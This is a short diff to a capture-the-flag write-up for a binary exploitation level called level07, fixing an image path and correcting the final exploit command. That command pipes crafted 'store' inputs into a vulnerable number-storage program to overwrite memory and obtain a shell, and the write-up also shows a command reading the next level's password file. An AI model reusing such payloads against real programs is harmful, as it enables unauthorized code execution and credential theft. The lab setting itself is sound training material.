@@ -2,7 +2,7 @@
 
 ## the stack
 
-![The stack](the_stack_override07.jpg)
+![The stack](resources/the_stack_override07.jpg)
 
 ## the method
 
@@ -67,7 +67,7 @@ $ cat /home/users/level08/.pass
 final command:
 
 ```sh
-$ (echo store; echo 4159090384; echo 1073741938 && echo store; echo 4159040368; echoecho store; echo 4160264172; echo 116 && echo quit; cat) | ./level07
+$ (echo store; echo 4159090384; echo 1073741938 ; echo store; echo 4159040368; echo 1073741939 ; echo store; echo 4160264172; echo 116 ; echo quit; cat) | ./level07
 ----------------------------------------------------
   Welcome to wil's crappy number storage service!
 ----------------------------------------------------
